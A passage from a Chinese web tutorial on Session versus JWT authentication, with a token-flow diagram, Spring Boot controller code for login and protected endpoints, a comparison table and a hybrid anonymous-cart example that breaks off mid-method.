</span><span id="__span-34-35"><a id="__codelineno-34-35" name="__codelineno-34-35" href="#__codelineno-34-35"></a>     │                            │     }
</span><span id="__span-34-36"><a id="__codelineno-34-36" name="__codelineno-34-36" href="#__codelineno-34-36"></a>     │                            │  3. 签名Token
</span><span id="__span-34-37"><a id="__codelineno-34-37" name="__codelineno-34-37" href="#__codelineno-34-37"></a>     │                            │
</span><span id="__span-34-38"><a id="__codelineno-34-38" name="__codelineno-34-38" href="#__codelineno-34-38"></a>     │  200 OK                    │
</span><span id="__span-34-39"><a id="__codelineno-34-39" name="__codelineno-34-39" href="#__codelineno-34-39"></a>     │  {                         │
</span><span id="__span-34-40"><a id="__codelineno-34-40" name="__codelineno-34-40" href="#__codelineno-34-40"></a>     │    &quot;access_token&quot;: &quot;eyJ...&quot;,
</span><span id="__span-34-41"><a id="__codelineno-34-41" name="__codelineno-34-41" href="#__codelineno-34-41"></a>     │    &quot;token_type&quot;: &quot;Bearer&quot;, │
</span><span id="__span-34-42"><a id="__codelineno-34-42" name="__codelineno-34-42" href="#__codelineno-34-42"></a>     │    &quot;expires_in&quot;: 3600      │
</span><span id="__span-34-43"><a id="__codelineno-34-43" name="__codelineno-34-43" href="#__codelineno-34-43"></a>     │  }                         │
</span><span id="__span-34-44"><a id="__codelineno-34-44" name="__codelineno-34-44" href="#__codelineno-34-44"></a>     │&lt;────────────────────────── │
</span><span id="__span-34-45"><a id="__codelineno-34-45" name="__codelineno-34-45" href="#__codelineno-34-45"></a>     │                            │
</span><span id="__span-34-46"><a id="__codelineno-34-46" name="__codelineno-34-46" href="#__codelineno-34-46"></a>     │  客户端保存Token            │
</span><span id="__span-34-47"><a id="__codelineno-34-47" name="__codelineno-34-47" href="#__codelineno-34-47"></a>     │  (内存/Cookie/Storage)     │
</span><span id="__span-34-48"><a id="__codelineno-34-48" name="__codelineno-34-48" href="#__codelineno-34-48"></a>     │                            │
</span><span id="__span-34-49"><a id="__codelineno-34-49" name="__codelineno-34-49" href="#__codelineno-34-49"></a>     │  GET /api/user/profile     │
</span><span id="__span-34-50"><a id="__codelineno-34-50" name="__codelineno-34-50" href="#__codelineno-34-50"></a>     │  Authorization: Bearer eyJ...
</span><span id="__span-34-51"><a id="__codelineno-34-51" name="__codelineno-34-51" href="#__codelineno-34-51"></a>     ├──────────────────────────&gt; │
</span><span id="__span-34-52"><a id="__codelineno-34-52" name="__codelineno-34-52" href="#__codelineno-34-52"></a>     │                            │
</span><span id="__span-34-53"><a id="__codelineno-34-53" name="__codelineno-34-53" href="#__codelineno-34-53"></a>     │                            │  验证Token签名
</span><span id="__span-34-54"><a id="__codelineno-34-54" name="__codelineno-34-54" href="#__codelineno-34-54"></a>     │                            │  提取用户信息
</span><span id="__span-34-55"><a id="__codelineno-34-55" name="__codelineno-34-55" href="#__codelineno-34-55"></a>     │                            │  执行业务逻辑
</span><span id="__span-34-56"><a id="__codelineno-34-56" name="__codelineno-34-56" href="#__codelineno-34-56"></a>     │                            │
</span><span id="__span-34-57"><a id="__codelineno-34-57" name="__codelineno-34-57" href="#__codelineno-34-57"></a>     │  200 OK                    │
</span><span id="__span-34-58"><a id="__codelineno-34-58" name="__codelineno-34-58" href="#__codelineno-34-58"></a>     │  { &quot;id&quot;: 1001, ... }       │
</span><span id="__span-34-59"><a id="__codelineno-34-59" name="__codelineno-34-59" href="#__codelineno-34-59"></a>     │&lt;────────────────────────── │
</span></code></pre></div>
<p><strong>RESTful API实现示例：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nd">@RestController</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ApiController</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="cm">     * 公开接口：无需Token</span>
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="cm">     */</span>
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/products&quot;</span><span class="p">)</span>
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Product</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">getProducts</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="w">        </span><span class="c1">// 任何人都可以访问，不需要Token</span>
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">productService</span><span class="p">.</span><span class="na">getAllProducts</span><span class="p">();</span>
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>
</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="cm">     * 受保护接口：必须有Token</span>
</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="cm">     */</span>
</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/api/user/profile&quot;</span><span class="p">)</span>
</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">UserProfile</span><span class="w"> </span><span class="nf">getMyProfile</span><span class="p">(</span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">authHeader</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="w">        </span><span class="c1">// 1. 检查Token是否存在</span>
</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">authHeader</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">authHeader</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;Bearer &quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnauthorizedException</span><span class="p">(</span><span class="s">&quot;Missing or invalid token&quot;</span><span class="p">);</span>
</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>
</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a><span class="w">        </span><span class="c1">// 2. 提取Token</span>
</span><span id="__span-35-24"><a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authHeader</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span>
</span><span id="__span-35-25"><a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>
</span><span id="__span-35-26"><a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a><span class="w">        </span><span class="c1">// 3. 验证Token</span>
</span><span id="__span-35-27"><a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-28"><a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a><span class="w">            </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">validateToken</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-35-29"><a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getSubject</span><span class="p">();</span>
</span><span id="__span-35-30"><a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a>
</span><span id="__span-35-31"><a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a><span class="w">            </span><span class="c1">// 4. 使用Token中的用户信息</span>
</span><span id="__span-35-32"><a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">userService</span><span class="p">.</span><span class="na">getProfile</span><span class="p">(</span><span class="n">userId</span><span class="p">);</span>
</span><span id="__span-35-33"><a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a>
</span><span id="__span-35-34"><a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-35"><a id="__codelineno-35-35" name="__codelineno-35-35" href="#__codelineno-35-35"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnauthorizedException</span><span class="p">(</span><span class="s">&quot;Invalid token&quot;</span><span class="p">);</span>
</span><span id="__span-35-36"><a id="__codelineno-35-36" name="__codelineno-35-36" href="#__codelineno-35-36"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-35-37"><a id="__codelineno-35-37" name="__codelineno-35-37" href="#__codelineno-35-37"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-35-38"><a id="__codelineno-35-38" name="__codelineno-35-38" href="#__codelineno-35-38"></a>
</span><span id="__span-35-39"><a id="__codelineno-35-39" name="__codelineno-35-39" href="#__codelineno-35-39"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-35-40"><a id="__codelineno-35-40" name="__codelineno-35-40" href="#__codelineno-35-40"></a><span class="cm">     * 登录接口：生成Token</span>
</span><span id="__span-35-41"><a id="__codelineno-35-41" name="__codelineno-35-41" href="#__codelineno-35-41"></a><span class="cm">     */</span>
</span><span id="__span-35-42"><a id="__codelineno-35-42" name="__codelineno-35-42" href="#__codelineno-35-42"></a><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/api/auth/login&quot;</span><span class="p">)</span>
</span><span id="__span-35-43"><a id="__codelineno-35-43" name="__codelineno-35-43" href="#__codelineno-35-43"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">TokenResponse</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">LoginRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-44"><a id="__codelineno-35-44" name="__codelineno-35-44" href="#__codelineno-35-44"></a><span class="w">        </span><span class="c1">// 1. 验证凭证</span>
</span><span id="__span-35-45"><a id="__codelineno-35-45" name="__codelineno-35-45" href="#__codelineno-35-45"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authService</span><span class="p">.</span><span class="na">authenticate</span><span class="p">(</span>
</span><span id="__span-35-46"><a id="__codelineno-35-46" name="__codelineno-35-46" href="#__codelineno-35-46"></a><span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">getUsername</span><span class="p">(),</span><span class="w"> </span>
</span><span id="__span-35-47"><a id="__codelineno-35-47" name="__codelineno-35-47" href="#__codelineno-35-47"></a><span class="w">            </span><span class="n">request</span><span class="p">.</span><span class="na">getPassword</span><span class="p">()</span>
</span><span id="__span-35-48"><a id="__codelineno-35-48" name="__codelineno-35-48" href="#__codelineno-35-48"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-35-49"><a id="__codelineno-35-49" name="__codelineno-35-49" href="#__codelineno-35-49"></a>
</span><span id="__span-35-50"><a id="__codelineno-35-50" name="__codelineno-35-50" href="#__codelineno-35-50"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">user</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-35-51"><a id="__codelineno-35-51" name="__codelineno-35-51" href="#__codelineno-35-51"></a><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BadCredentialsException</span><span class="p">(</span><span class="s">&quot;Invalid credentials&quot;</span><span class="p">);</span>
</span><span id="__span-35-52"><a id="__codelineno-35-52" name="__codelineno-35-52" href="#__codelineno-35-52"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-35-53"><a id="__codelineno-35-53" name="__codelineno-35-53" href="#__codelineno-35-53"></a>
</span><span id="__span-35-54"><a id="__codelineno-35-54" name="__codelineno-35-54" href="#__codelineno-35-54"></a><span class="w">        </span><span class="c1">// 2. 只有验证成功后才生成Token</span>
</span><span id="__span-35-55"><a id="__codelineno-35-55" name="__codelineno-35-55" href="#__codelineno-35-55"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">accessToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateAccessToken</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-35-56"><a id="__codelineno-35-56" name="__codelineno-35-56" href="#__codelineno-35-56"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">refreshToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateRefreshToken</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-35-57"><a id="__codelineno-35-57" name="__codelineno-35-57" href="#__codelineno-35-57"></a>
</span><span id="__span-35-58"><a id="__codelineno-35-58" name="__codelineno-35-58" href="#__codelineno-35-58"></a><span class="w">        </span><span class="c1">// 3. 返回Token</span>
</span><span id="__span-35-59"><a id="__codelineno-35-59" name="__codelineno-35-59" href="#__codelineno-35-59"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenResponse</span><span class="p">(</span>
</span><span id="__span-35-60"><a id="__codelineno-35-60" name="__codelineno-35-60" href="#__codelineno-35-60"></a><span class="w">            </span><span class="n">accessToken</span><span class="p">,</span>
</span><span id="__span-35-61"><a id="__codelineno-35-61" name="__codelineno-35-61" href="#__codelineno-35-61"></a><span class="w">            </span><span class="s">&quot;Bearer&quot;</span><span class="p">,</span>
</span><span id="__span-35-62"><a id="__codelineno-35-62" name="__codelineno-35-62" href="#__codelineno-35-62"></a><span class="w">            </span><span class="mi">3600</span><span class="p">,</span><span class="w">  </span><span class="c1">// 1小时</span>
</span><span id="__span-35-63"><a id="__codelineno-35-63" name="__codelineno-35-63" href="#__codelineno-35-63"></a><span class="w">            </span><span class="n">refreshToken</span>
</span><span id="__span-35-64"><a id="__codelineno-35-64" name="__codelineno-35-64" href="#__codelineno-35-64"></a><span class="w">        </span><span class="p">);</span>
</span><span id="__span-35-65"><a id="__codelineno-35-65" name="__codelineno-35-65" href="#__codelineno-35-65"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-35-66"><a id="__codelineno-35-66" name="__codelineno-35-66" href="#__codelineno-35-66"></a><span class="p">}</span>
</span></code></pre></div>
<h4 id="对比总结">对比总结<a class="headerlink" href="#对比总结" title="链接到此标题">&para;</a></h4>
<table>
<thead>
<tr>
<th>维度</th>
<th>Session</th>
<th>JWT Token</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>未登录时</strong></td>
<td>可能创建匿名Session</td>
<td><strong>不会生成Token</strong></td>
</tr>
<tr>
<td><strong>生成时机</strong></td>
<td>第一次访问或登录时</td>
<td><strong>仅在登录成功后</strong></td>
</tr>
<tr>
<td><strong>未登录用户</strong></td>
<td>可以跟踪（匿名Session）</td>
<td>无法跟踪（无Token）</td>
</tr>
<tr>
<td><strong>典型用途</strong></td>
<td>购物车、浏览历史、推荐</td>
<td>认证和授权</td>
</tr>
<tr>
<td><strong>包含信息</strong></td>
<td>可以为空或只有匿名数据</td>
<td>必须包含用户身份</td>
</tr>
<tr>
<td><strong>服务器存储</strong></td>
<td>需要（即使匿名）</td>
<td>不需要</td>
</tr>
<tr>
<td><strong>资源占用</strong></td>
<td>占用（每个访客都有）</td>
<td>不占用（只有登录用户）</td>
</tr>
</tbody>
</table>
<p><strong>关键区别：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Session：
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>✅ 可以在未登录时创建（用于跟踪匿名用户）
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>✅ 登录后在Session中添加用户信息
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>✅ Session本身是容器，可以存储任何数据
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>✅ 适合需要跟踪匿名用户的场景
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>JWT Token：
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>✅ 只在登录成功后生成
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>✅ Token本身就代表&quot;已认证&quot;
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>✅ Token必须包含用户身份信息
</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>✅ 适合纯API认证场景
</span></code></pre></div>
<p><strong>实际应用建议：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>场景1：需要跟踪匿名用户（电商、社交）
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>推荐：使用Session
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>原因：
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>- 未登录用户也需要购物车
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>- 需要记录浏览历史做推荐
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>- 需要保存用户偏好设置
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>场景2：纯API认证（移动App、微服务）
</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>推荐：使用JWT
</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>原因：
</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>- 不需要跟踪匿名用户
</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>- 只有登录用户才能访问API
</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>- 无状态，易于扩展
</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>
</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a>场景3：混合场景（Web + Mobile）
</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>推荐：组合使用
</span><span id="__span-37-17"><a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a>- Web端：未登录用LocalStorage/匿名Session
</span><span id="__span-37-18"><a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a>- 登录后：生成JWT Token
</span><span id="__span-37-19"><a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a>- 迁移匿名数据到用户账户
</span></code></pre></div>
<p><strong>代码示例：混合方案</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="cm">/**</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="cm"> * 混合方案：匿名购物车 + JWT认证</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="cm"> */</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="nd">@Service</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HybridCartService</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="cm">     * 未登录：使用匿名标识（客户端生成的UUID）</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="cm">     */</span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addToAnonymousCart</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">anonymousId</span><span class="p">,</span><span class="w"> </span><span class="n">Product</span><span class="w"> </span><span class="n">product</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w">        </span><span class="c1">// 存储在临时表或缓存中</span>
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;anonymous:cart:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">anonymousId</span><span class="p">;</span>
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="w">        </span><span class="n">redis</span><span class="p">.</span><span class="na">sadd</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">product</span><span class="p">.</span><span class="na">getId</span><span class="p">());</span>
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="w">        </span><span class="n">redis</span><span class="p">.</span><span class="na">expire</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="n">TimeUnit</span><span class="p">.</span><span class="na">DAYS</span><span class="p">);</span><span class="w">  </span><span class="c1">// 7天过期</span>
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>
</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a><span class="cm">     * 登录：生成JWT + 迁移匿名购物车</span>
</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a><span class="cm">     */</span>
</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">TokenResponse</span><span class="w"> </span><span class="nf">loginAndMergeCart</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="w">                                          </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a><span class="w">                                          </span><span class="n">String</span><span class="w"> </span><span class="n">anonymousId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a><span class="w">        </span><span class="c1">// 1. 验证凭证</span>
</span><span id="__span-38-24"><a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">authenticate</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">);</span>
</span><span id="__span-38-25"><a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a>
</span><span id="__span-38-26"><a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a><span class="w">        </span><span class="c1">// 2. 生成JWT Token</span>
</span><span id="__span-38-27"><a id="__codelineno-38-27" name="__codelineno-38-27" href="#__codelineno-38-27"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">generateToken</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
</span><span id="__span-38-28"><a id="__codelineno-38-28" name="__codelineno-38-28" href="#__codelineno-38-28"></a>
</span><span id="__span-38-29"><a id="__codelineno-38-29" name="__codelineno-38-29" href="#__codelineno-38-29"></a><span class="w">        </span><span class="c1">// 3. 迁移匿名购物车</span>
</span><span id="__span-38-30"><a id="__codelineno-38-30" name="__codelineno-38-30" href="#__codelineno-38-30"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">anonymousId</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-31"><a id="__codelineno-38-31" name="__codelineno-38-31" href="#__codelineno-38-31"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">anonymousKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;anonymous:cart:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">anonymousId</span><span class="p">;</span>
